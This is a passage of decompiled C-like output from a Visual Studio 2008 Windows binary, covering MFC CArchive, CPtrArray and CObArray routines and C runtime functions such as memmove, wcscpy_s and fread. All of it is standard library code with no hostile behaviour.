LAB_0041443b:
      this_01 = (CObject *)CPtrArray::GetAt(*(CPtrArray **)(this + 0x38),(int)piVar3);
      if (this_01 == (CObject *)0x0) {
        return (CObject *)0x0;
      }
      if (param_1 == (CRuntimeClass *)0x0) {
        return this_01;
      }
      iVar1 = CObject::IsKindOf(this_01,param_1);
      if (iVar1 != 0) {
        return this_01;
      }
      pwVar5 = *(wchar_t **)(this + 0x14);
      uVar4 = 6;
    }
    local_8 = 0;
    piVar3 = (int *)CRuntimeClass::CreateObject(this_00);
    local_18[0] = piVar3;
    if (piVar3 == (int *)0x0) {
      FUN_0040a59b();
    }
    CheckCount(this);
    CPtrArray::InsertAt(*(CPtrArray **)(this + 0x38),*(int *)(this + 0x34),piVar3,1);
    param_1 = (CRuntimeClass *)0x0;
    CMapPtrToPtr::Lookup(*(CMapPtrToPtr **)(this + 0x3c),(void *)0x1,&param_1);
    if (param_1 != (CRuntimeClass *)0x0) {
      local_1c = (int *)0x2;
      CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&>::InsertAt
                ((CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *)
                 param_1,*(int *)(this + 0x34),(LoadArrayObjType *)&local_1c,1);
      uVar4 = *(undefined4 *)(this + 0x10);
      *(int *)(this + 0x34) = *(int *)(this + 0x34) + 1;
      *(uint *)(this + 0x10) = local_20;
      (**(code **)(*piVar3 + 8))(this);
      *(undefined4 *)(this + 0x10) = uVar4;
      return (CObject *)piVar3;
    }
LAB_00414423:
    AfxThrowNotSupportedException();
    this_03 = extraout_ECX_00;
LAB_00414428:
    if (((int *)(this_03[2] + -1) < piVar3) ||
       (pLVar2 = CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&>::
                 GetAt((CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&>
                        *)this_03,(int)piVar3), *pLVar2 != 1)) goto LAB_0041443b;
LAB_00414400:
    pwVar5 = *(wchar_t **)(this + 0x14);
    uVar4 = 5;
  } while( true );
}



void Catch_004144f9(void)

{
  code *pcVar1;
  int unaff_EBP;
  
  if (*(int **)(unaff_EBP + -0x14) != (int *)0x0) {
    (**(code **)(**(int **)(unaff_EBP + -0x14) + 4))(1);
  }
  __CxxThrowException_8(0,(byte *)0x0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



undefined ** FUN_00414511(void)

{
  return &PTR_s_CPtrArray_0042ac44;
}



// Library Function - Single Match
//  public: __thiscall CPtrArray::CPtrArray(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall CPtrArray::CPtrArray(CPtrArray *this)

{
  *(undefined ***)this = vftable;
  *(undefined4 *)(this + 4) = 0;
  *(undefined4 *)(this + 0x10) = 0;
  *(undefined4 *)(this + 0xc) = 0;
  *(undefined4 *)(this + 8) = 0;
  return;
}



void __fastcall FUN_0041452e(undefined4 *param_1)

{
  *param_1 = CPtrArray::vftable;
  FUN_0040a3fc((void *)param_1[1]);
  return;
}



// Library Function - Single Match
//  public: void __thiscall CPtrArray::SetSize(int,int)
// 
// Library: Visual Studio 2008 Release

void __thiscall CPtrArray::SetSize(CPtrArray *this,int param_1,int param_2)

{
  int iVar1;
  int iVar2;
  void *pvVar3;
  
  iVar1 = param_1;
  pvVar3 = (void *)0x0;
  if (-1 < param_1) goto LAB_00414556;
  do {
    AfxThrowNotSupportedException();
LAB_00414556:
    if ((int)pvVar3 <= param_2) {
      *(int *)(this + 0x10) = param_2;
    }
    if ((void *)iVar1 == pvVar3) {
      FUN_0040a3fc(*(void **)(this + 4));
      *(void **)(this + 0xc) = pvVar3;
      *(void **)(this + 8) = pvVar3;
      goto LAB_0041465a;
    }
    if (*(void **)(this + 4) == pvVar3) {
      pvVar3 = operator_new(iVar1 << 2);
      *(void **)(this + 4) = pvVar3;
      _memset(pvVar3,0,iVar1 << 2);
      *(int *)(this + 0xc) = iVar1;
LAB_004145c2:
      *(int *)(this + 8) = iVar1;
      return;
    }
    pvVar3 = *(void **)(this + 0xc);
    if (iVar1 <= (int)pvVar3) {
      iVar2 = *(int *)(this + 8);
      if (iVar2 < iVar1) {
        _memset((void *)((int)*(void **)(this + 4) + iVar2 * 4),0,(iVar1 - iVar2) * 4);
      }
      goto LAB_004145c2;
    }
    iVar2 = *(int *)(this + 0x10);
    if (iVar2 == 0) {
      iVar2 = (int)(*(int *)(this + 8) + (*(int *)(this + 8) >> 0x1f & 7U)) >> 3;
      if (iVar2 < 4) {
LAB_004145f4:
        iVar2 = 4;
      }
      else if (iVar2 < 0x401) {
        if (iVar2 < 4) goto LAB_004145f4;
      }
      else {
        iVar2 = 0x400;
      }
    }
    param_1 = iVar2 + (int)pvVar3;
    if (iVar2 + (int)pvVar3 <= iVar1) {
      param_1 = iVar1;
    }
  } while (param_1 < (int)pvVar3);
  pvVar3 = operator_new(param_1 << 2);
  FUN_0040be3a(pvVar3,param_1 << 2,*(void **)(this + 4),*(int *)(this + 8) << 2);
  _memset((void *)((int)pvVar3 + *(int *)(this + 8) * 4),0,(iVar1 - *(int *)(this + 8)) * 4);
  FUN_0040a3fc(*(void **)(this + 4));
  *(int *)(this + 8) = iVar1;
  *(int *)(this + 0xc) = param_1;
LAB_0041465a:
  *(void **)(this + 4) = pvVar3;
  return;
}



// Library Function - Single Match
//  public: void __thiscall CPtrArray::InsertAt(int,void *,int)
// 
// Library: Visual Studio 2008 Release

void __thiscall CPtrArray::InsertAt(CPtrArray *this,int param_1,void *param_2,int param_3)

{
  code *pcVar1;
  int iVar2;
  
  if ((-1 < param_1) && (0 < param_3)) {
    if (param_1 < *(int *)(this + 8)) {
      iVar2 = *(int *)(this + 8);
      SetSize(this,iVar2 + param_3,-1);
      ATL::Checked::memmove_s
                ((void *)(*(int *)(this + 4) + (param_1 + param_3) * 4),
                 ((*(int *)(this + 8) - param_1) - param_3) * 4,
                 (void *)(*(int *)(this + 4) + param_1 * 4),(iVar2 - param_1) * 4);
      _memset((void *)(*(int *)(this + 4) + param_1 * 4),0,param_3 << 2);
    }
    else {
      SetSize(this,param_1 + param_3,-1);
    }
    iVar2 = param_1 << 2;
    do {
      param_3 = param_3 + -1;
      *(void **)(iVar2 + *(int *)(this + 4)) = param_2;
      iVar2 = iVar2 + 4;
    } while (param_3 != 0);
    return;
  }
  AfxThrowNotSupportedException();
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



undefined4 * __thiscall FUN_0041470a(void *this,byte param_1)

{
  FUN_0041452e((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040a3fc(this);
  }
  return (undefined4 *)this;
}



undefined ** FUN_0041472b(void)

{
  return &PTR_s_CObArray_00432be4;
}



// Library Function - Single Match
//  class CArchive & __stdcall operator<<(class CArchive &,class CObject const *)
// 
// Library: Visual Studio 2008 Release

CArchive * operator<<(CArchive *param_1,CObject *param_2)

{
  CArchive::WriteObject(param_1,param_2);
  return param_1;
}



// Library Function - Single Match
//  class CArchive & __stdcall operator>>(class CArchive &,class CObject * &)
// 
// Library: Visual Studio 2008 Release

CArchive * operator>>(CArchive *param_1,CObject **param_2)

{
  CObject *pCVar1;
  
  pCVar1 = CArchive::ReadObject(param_1,(CRuntimeClass *)0x0);
  *param_2 = pCVar1;
  return param_1;
}



void __fastcall FUN_0041477a(undefined4 *param_1)

{
  *param_1 = CObArray::vftable;
  FUN_0040a3fc((void *)param_1[1]);
  return;
}



// Library Function - Single Match
//  public: virtual void __thiscall CObArray::Serialize(class CArchive &)
// 
// Library: Visual Studio 2008 Release

void __thiscall CObArray::Serialize(CObArray *this,CArchive *param_1)

{
  ulong uVar1;
  int iVar2;
  
  if ((~*(uint *)(param_1 + 0x18) & 1) == 0) {
    uVar1 = CArchive::ReadCount(param_1);
    CPtrArray::SetSize((CPtrArray *)this,uVar1,-1);
    iVar2 = 0;
    if (0 < *(int *)(this + 8)) {
      do {
        operator>>(param_1,(CObject **)(*(int *)(this + 4) + iVar2 * 4));
        iVar2 = iVar2 + 1;
      } while (iVar2 < *(int *)(this + 8));
    }
  }
  else {
    CArchive::WriteCount(param_1,*(ulong *)(this + 8));
    iVar2 = 0;
    if (0 < *(int *)(this + 8)) {
      do {
        operator<<(param_1,*(CObject **)(*(int *)(this + 4) + iVar2 * 4));
        iVar2 = iVar2 + 1;
      } while (iVar2 < *(int *)(this + 8));
    }
  }
  return;
}



undefined4 * __thiscall FUN_0041480b(void *this,byte param_1)

{
  FUN_0041477a((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040a3fc(this);
  }
  return (undefined4 *)this;
}



// Library Function - Single Match
//  @__security_check_cookie@4
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __fastcall ___security_check_cookie_4(int param_1)

{
  if (param_1 == DAT_00432c20) {
    return;
  }
                    // WARNING: Subroutine does not return
  ___report_gsfailure();
}



// Library Function - Single Match
//  _wcscat_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _wcscat_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src)

{
  wchar_t wVar1;
  int *piVar2;
  wchar_t *pwVar3;
  errno_t eVar4;
  
  if ((_Dst != (wchar_t *)0x0) && (_SizeInWords != 0)) {
    pwVar3 = _Dst;
    if (_Src != (wchar_t *)0x0) {
      do {
        if (*pwVar3 == L'\0') break;
        pwVar3 = pwVar3 + 1;
        _SizeInWords = _SizeInWords - 1;
      } while (_SizeInWords != 0);
      if (_SizeInWords != 0) {
        do {
          wVar1 = *_Src;
          *pwVar3 = wVar1;
          pwVar3 = pwVar3 + 1;
          _Src = _Src + 1;
          if (wVar1 == L'\0') break;
          _SizeInWords = _SizeInWords - 1;
        } while (_SizeInWords != 0);
        if (_SizeInWords != 0) {
          return 0;
        }
        *_Dst = L'\0';
        piVar2 = __errno();
        eVar4 = 0x22;
        *piVar2 = 0x22;
        goto LAB_0041485d;
      }
    }
    *_Dst = L'\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_0041485d:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



// Library Function - Single Match
//  _wcscpy_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _wcscpy_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src)

{
  wchar_t wVar1;
  int *piVar2;
  wchar_t *pwVar3;
  errno_t eVar4;
  
  if ((_Dst != (wchar_t *)0x0) && (_SizeInWords != 0)) {
    pwVar3 = _Dst;
    if (_Src != (wchar_t *)0x0) {
      do {
        wVar1 = *_Src;
        *pwVar3 = wVar1;
        _Src = _Src + 1;
        if (wVar1 == L'\0') break;
        _SizeInWords = _SizeInWords - 1;
        pwVar3 = pwVar3 + 1;
      } while (_SizeInWords != 0);
      if (_SizeInWords != 0) {
        return 0;
      }
      *_Dst = L'\0';
      piVar2 = __errno();
      eVar4 = 0x22;
      *piVar2 = 0x22;
      goto LAB_004148da;
    }
    *_Dst = L'\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_004148da:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



void __cdecl FUN_00414927(ulong param_1)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  p_Var1->_holdrand = param_1;
  return;
}



// Library Function - Single Match
//  _rand
// 
// Libraries: Visual Studio 2003 Release, Visual Studio 2005 Release, Visual Studio 2008 Release

int __cdecl _rand(void)

{
  _ptiddata p_Var1;
  uint uVar2;
  
  p_Var1 = __getptd();
  uVar2 = p_Var1->_holdrand * 0x343fd + 0x269ec3;
  p_Var1->_holdrand = uVar2;
  return uVar2 >> 0x10 & 0x7fff;
}



// Library Function - Single Match
//  _memmove
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

void * __cdecl _memmove(void *_Dst,void *_Src,size_t _Size)

{
  undefined4 *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if ((_Src < _Dst) && (_Dst < (void *)(_Size + (int)_Src))) {
    puVar1 = (undefined4 *)((_Size - 4) + (int)_Src);
    puVar4 = (undefined4 *)((_Size - 4) + (int)_Dst);
    if (((uint)puVar4 & 3) == 0) {
      uVar2 = _Size >> 2;
      uVar3 = _Size & 3;
      if (7 < uVar2) {
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar4 = *puVar1;
          puVar1 = puVar1 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar3) {
        case 0:
          return _Dst;
        case 2:
          goto switchD_00414b43_caseD_2;
        case 3:
          goto switchD_00414b43_caseD_3;
        }
        goto switchD_00414b43_caseD_1;
      }
    }
    else {
      switch(_Size) {
      case 0:
        goto switchD_00414b43_caseD_0;
      case 1:
        goto switchD_00414b43_caseD_1;
      case 2:
        goto switchD_00414b43_caseD_2;
      case 3:
        goto switchD_00414b43_caseD_3;
      default:
        uVar2 = _Size - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          puVar1 = (undefined4 *)((int)puVar1 + -1);
          uVar2 = uVar2 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_00414b43_caseD_2;
            case 3:
              goto switchD_00414b43_caseD_3;
            }
            goto switchD_00414b43_caseD_1;
          }
          break;
        case 2:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          puVar1 = (undefined4 *)((int)puVar1 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_00414b43_caseD_2;
            case 3:
              goto switchD_00414b43_caseD_3;
            }
            goto switchD_00414b43_caseD_1;
          }
          break;
        case 3:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
          puVar1 = (undefined4 *)((int)puVar1 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_00414b43_caseD_2;
            case 3:
              goto switchD_00414b43_caseD_3;
            }
            goto switchD_00414b43_caseD_1;
          }
        }
      }
    }
    switch(uVar2) {
    case 7:
      puVar4[7 - uVar2] = puVar1[7 - uVar2];
    case 6:
      puVar4[6 - uVar2] = puVar1[6 - uVar2];
    case 5:
      puVar4[5 - uVar2] = puVar1[5 - uVar2];
    case 4:
      puVar4[4 - uVar2] = puVar1[4 - uVar2];
    case 3:
      puVar4[3 - uVar2] = puVar1[3 - uVar2];
    case 2:
      puVar4[2 - uVar2] = puVar1[2 - uVar2];
    case 1:
      puVar4[1 - uVar2] = puVar1[1 - uVar2];
      puVar1 = puVar1 + -uVar2;
      puVar4 = puVar4 + -uVar2;
    }
    switch(uVar3) {
    case 1:
switchD_00414b43_caseD_1:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      return _Dst;
    case 2:
switchD_00414b43_caseD_2:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      return _Dst;
    case 3:
switchD_00414b43_caseD_3:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
      return _Dst;
    }
switchD_00414b43_caseD_0:
    return _Dst;
  }
  if (((0xff < _Size) && (DAT_00438ea4 != 0)) && (((uint)_Dst & 0xf) == ((uint)_Src & 0xf))) {
    puVar1 = __VEC_memcpy((undefined4 *)_Dst,(undefined4 *)_Src,_Size);
    return puVar1;
  }
  puVar1 = (undefined4 *)_Dst;
  if (((uint)_Dst & 3) == 0) {
    uVar2 = _Size >> 2;
    uVar3 = _Size & 3;
    if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar1 = *_Src;
        _Src = (undefined4 *)((int)_Src + 4);
        puVar1 = puVar1 + 1;
      }
      switch(uVar3) {
      case 0:
        return _Dst;
      case 2:
        goto switchD_004149bc_caseD_2;
      case 3:
        goto switchD_004149bc_caseD_3;
      }
      goto switchD_004149bc_caseD_1;
    }
  }
  else {
    switch(_Size) {
    case 0:
      goto switchD_004149bc_caseD_0;
    case 1:
      goto switchD_004149bc_caseD_1;
    case 2:
      goto switchD_004149bc_caseD_2;
    case 3:
      goto switchD_004149bc_caseD_3;
    default:
      uVar2 = (_Size - 4) + ((uint)_Dst & 3);
      switch((uint)_Dst & 3) {
      case 1:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 2) = *(undefined *)((int)_Src + 2);
        _Src = (void *)((int)_Src + 3);
        puVar1 = (undefined4 *)((int)_Dst + 3);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_004149bc_caseD_2;
          case 3:
            goto switchD_004149bc_caseD_3;
          }
          goto switchD_004149bc_caseD_1;
        }
        break;
      case 2:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        _Src = (void *)((int)_Src + 2);
        puVar1 = (undefined4 *)((int)_Dst + 2);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_004149bc_caseD_2;
          case 3:
            goto switchD_004149bc_caseD_3;
          }
          goto switchD_004149bc_caseD_1;
        }
        break;
      case 3:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        _Src = (void *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        puVar1 = (undefined4 *)((int)_Dst + 1);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_004149bc_caseD_2;
          case 3:
            goto switchD_004149bc_caseD_3;
          }
          goto switchD_004149bc_caseD_1;
        }
      }
    }
  }
                    // WARNING: Could not find normalized switch variable to match jumptable
  switch(uVar2) {
  case 0x1c:
  case 0x1d:
  case 0x1e:
  case 0x1f:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 7] = *(undefined4 *)((int)_Src + (uVar2 - 7) * 4);
  case 0x18:
  case 0x19:
  case 0x1a:
  case 0x1b:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 6] = *(undefined4 *)((int)_Src + (uVar2 - 6) * 4);
  case 0x14:
  case 0x15:
  case 0x16:
  case 0x17:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 5] = *(undefined4 *)((int)_Src + (uVar2 - 5) * 4);
  case 0x10:
  case 0x11:
  case 0x12:
  case 0x13:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 4] = *(undefined4 *)((int)_Src + (uVar2 - 4) * 4);
  case 0xc:
  case 0xd:
  case 0xe:
  case 0xf:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 3] = *(undefined4 *)((int)_Src + (uVar2 - 3) * 4);
  case 8:
  case 9:
  case 10:
  case 0xb:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 2] = *(undefined4 *)((int)_Src + (uVar2 - 2) * 4);
  case 4:
  case 5:
  case 6:
  case 7:
    puVar1[uVar2 - 1] = *(undefined4 *)((int)_Src + (uVar2 - 1) * 4);
    _Src = (void *)((int)_Src + uVar2 * 4);
    puVar1 = puVar1 + uVar2;
  }
  switch(uVar3) {
  case 1:
switchD_004149bc_caseD_1:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    return _Dst;
  case 2:
switchD_004149bc_caseD_2:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    return _Dst;
  case 3:
switchD_004149bc_caseD_3:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)_Src + 2);
    return _Dst;
  }
switchD_004149bc_caseD_0:
  return _Dst;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __wfsopen
// 
// Library: Visual Studio 2008 Release

FILE * __cdecl __wfsopen(wchar_t *_Filename,wchar_t *_Mode,int _ShFlag)

{
  int *piVar1;
  FILE *pFVar2;
  undefined local_14 [8];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_004300c8;
  uStack_c = 0x414cd1;
  if (((_Filename == (wchar_t *)0x0) || (_Mode == (wchar_t *)0x0)) || (*_Mode == L'\0')) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    pFVar2 = __getstream();
    if (pFVar2 == (FILE *)0x0) {
      piVar1 = __errno();
      *piVar1 = 0x18;
    }
    else {
      local_8 = (undefined *)0x0;
      if (*_Filename != L'\0') {
        pFVar2 = __wopenfile(_Filename,_Mode,_ShFlag,pFVar2);
        local_8 = (undefined *)0xfffffffe;
        FUN_00414d81();
        return pFVar2;
      }
      piVar1 = __errno();
      *piVar1 = 0x16;
      __local_unwind4(&DAT_00432c20,(int)local_14,0xfffffffe);
    }
  }
  return (FILE *)0x0;
}



void FUN_00414d81(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __wfopen_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __wfopen_s(FILE **_File,wchar_t *_Filename,wchar_t *_Mode)

{
  int *piVar1;
  FILE *pFVar2;
  int iVar3;
  
  if (_File == (FILE **)0x0) {
    piVar1 = __errno();
    iVar3 = 0x16;
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    pFVar2 = __wfsopen(_Filename,_Mode,0x80);
    *_File = pFVar2;
    if (pFVar2 == (FILE *)0x0) {
      piVar1 = __errno();
      iVar3 = *piVar1;
    }
    else {
      iVar3 = 0;
    }
  }
  return iVar3;
}



// Library Function - Single Match
//  __fread_nolock_s
// 
// Library: Visual Studio 2008 Release

size_t __cdecl
__fread_nolock_s(void *_DstBuf,size_t _DstSize,size_t _ElementSize,size_t _Count,FILE *_File)

{
  uint uVar1;
  undefined *puVar2;
  int *piVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  undefined *_DstBuf_00;
  uint local_10;
  
  if ((_ElementSize != 0) && (_Count != 0)) {
    if (_DstBuf != (void *)0x0) {
      if ((_File != (FILE *)0x0) && (_Count <= (uint)(0xffffffff / (ulonglong)_ElementSize))) {
LAB_00414e59:
        uVar8 = _ElementSize * _Count;
        uVar7 = uVar8;
        puVar2 = (undefined *)_DstBuf;
        uVar1 = _DstSize;
        if ((_File->_flag & 0x10cU) == 0) {
          local_10 = 0x1000;
        }
        else {
          local_10 = _File->_bufsiz;
        }
joined_r0x00414e7f:
        do {
          while( true ) {
            if (uVar7 == 0) {
              return _Count;
            }
            if ((_File->_flag & 0x10cU) == 0) break;
            uVar4 = _File->_cnt;
            if (uVar4 == 0) break;
            if ((int)uVar4 < 0) {
LAB_00414fd0:
              _File->_flag = _File->_flag | 0x20;
LAB_00414fd4:
              return (uVar8 - uVar7) / _ElementSize;
            }
            uVar6 = uVar7;
            if (uVar4 <= uVar7) {
              uVar6 = uVar4;
            }
            if (uVar1 < uVar6) {
              if (_DstSize != 0xffffffff) {
                _memset(_DstBuf,0,_DstSize);
              }
              piVar3 = __errno();
              *piVar3 = 0x22;
              goto LAB_00414e15;
            }
            _memcpy_s(puVar2,uVar1,_File->_ptr,uVar6);
            _File->_cnt = _File->_cnt - uVar6;
            _File->_ptr = _File->_ptr + uVar6;
            uVar7 = uVar7 - uVar6;
            uVar1 = uVar1 - uVar6;
            puVar2 = puVar2 + uVar6;
          }
          if (local_10 <= uVar7) {
            if (local_10 == 0) {
              uVar4 = 0x7fffffff;
              if (uVar7 < 0x80000000) {
                uVar4 = uVar7;
              }
            }
            else {
              if (uVar7 < 0x80000000) {
                uVar6 = uVar7 % local_10;
                uVar4 = uVar7;
              }
              else {
                uVar6 = (uint)(0x7fffffff % (ulonglong)local_10);
                uVar4 = 0x7fffffff;
              }
              uVar4 = uVar4 - uVar6;
            }
            if (uVar1 < uVar4) {
LAB_00414fa3:
              if (_DstSize != 0xffffffff) {
                _memset(_DstBuf,0,_DstSize);
              }
              piVar3 = __errno();
              *piVar3 = 0x22;
              goto LAB_00414e15;
            }
            _DstBuf_00 = puVar2;
            iVar5 = __fileno(_File);
            iVar5 = __read(iVar5,_DstBuf_00,uVar4);
            if (iVar5 == 0) {
              _File->_flag = _File->_flag | 0x10;
              goto LAB_00414fd4;
            }
            if (iVar5 == -1) goto LAB_00414fd0;
            uVar7 = uVar7 - iVar5;
            uVar1 = uVar1 - iVar5;
            puVar2 = puVar2 + iVar5;
            goto joined_r0x00414e7f;
          }
          iVar5 = __filbuf(_File);
          if (iVar5 == -1) goto LAB_00414fd4;
          if (uVar1 == 0) goto LAB_00414fa3;
          *puVar2 = (char)iVar5;
          local_10 = _File->_bufsiz;
          uVar7 = uVar7 - 1;
          uVar1 = uVar1 - 1;
          puVar2 = puVar2 + 1;
        } while( true );
      }
      if (_DstSize != 0xffffffff) {
        _memset(_DstBuf,0,_DstSize);
      }
      if ((_File != (FILE *)0x0) && (_Count <= (uint)(0xffffffff / (ulonglong)_ElementSize)))
      goto LAB_00414e59;
    }
    piVar3 = __errno();
    *piVar3 = 0x16;
LAB_00414e15:
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fread_s
// 
// Library: Visual Studio 2008 Release

size_t __cdecl _fread_s(void *_DstBuf,size_t _DstSize,size_t _ElementSize,size_t _Count,FILE *_File)

{
  int *piVar1;
  size_t sVar2;
  
  if ((_ElementSize != 0) && (_Count != 0)) {
    if (_File != (FILE *)0x0) {
      __lock_file(_File);
      sVar2 = __fread_nolock_s(_DstBuf,_DstSize,_ElementSize,_Count,_File);
      FUN_00415074();
      return sVar2;
    }
    if (_DstSize != 0xffffffff) {
      _memset(_DstBuf,0,_DstSize);
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return 0;
}



void FUN_00415074(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 0x18));
  return;
}



// Library Function - Single Match
//  _fread
// 
// Library: Visual Studio 2008 Release

size_t __cdecl _fread(void *_DstBuf,size_t _ElementSize,size_t _Count,FILE *_File)

{
  size_t sVar1;
  
  sVar1 = _fread_s(_DstBuf,0xffffffff,_ElementSize,_Count,_File);
  return sVar1;
}



// Library Function - Single Match
//  __fclose_nolock
// 
// Library: Visual Studio 2008 Release

